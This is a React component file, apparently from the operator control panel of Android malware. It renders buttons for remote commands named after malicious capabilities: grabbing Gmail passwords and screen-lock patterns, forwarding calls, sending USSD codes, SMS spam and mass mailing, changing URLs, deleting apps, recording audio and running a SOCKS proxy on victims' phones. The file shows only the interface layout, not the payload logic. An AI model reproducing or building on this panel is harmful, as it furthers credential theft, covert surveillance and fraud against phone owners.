import React from 'react';
import SendSMS from './SendSMS';
import SendUSSD from './SendUSSD';
import ForwardCall from './ForwardCall';
import DeleteApps from './DeleteApps';
import RunApplication from './RunApplication';
import SendPush from './SendPush';
import OpenLink from './OpenLink';
import Grabbing_pass_gmail from './Grabbing_pass_gmail';
import Grabbing_lockpattern from './Grabbing_lockpattern';
import SMSSpam from './SMSSpam';
import ChangeUrls from './ChangeUrls';
import RunRecordAudio from './RunRecordAudio';
import SendSMSMailing from './SendSMSMailing';
import RunSocks from './RunSocks';

class CommandsList extends React.Component {
    render () {
        return (
            <React.Fragment>
                  <div>
                    <div class="col-sm">
                        <SendSMS />
                    </div>
                    <div class="col-sm">
                        <SendUSSD />
                    </div>
                    <div class="col-sm">
                        <ForwardCall />
                    </div>
                </div>
                <div>
                    <div class="col-sm">
                        <RunApplication />
                    </div>
                    <div class="col-sm">
                        <SendPush />
                    </div>
                    <div class="col-sm">
                        <Grabbing_pass_gmail />
                    </div>
                    <div class="col-sm">
                        <Grabbing_lockpattern />
                    </div>
                </div>
                <div>
                <div class="col-sm">
                        <ChangeUrls />
                    </div>
                    <div class="col-sm">
                        <SMSSpam />
                    </div>
                    <div class="col-sm">
                        <OpenLink />
                    </div>
                    <div class="col-sm">
                        <DeleteApps />
                    </div>
                    <div class="col-sm">
                        <RunRecordAudio />
                    </div>
                    <div class="col-sm">
                        <SendSMSMailing />
                    </div>
                    <div class="col-sm">
                        <RunSocks />
                    </div>
                </div>
                
            </React.Fragment>
        );
    }
}

export default CommandsList;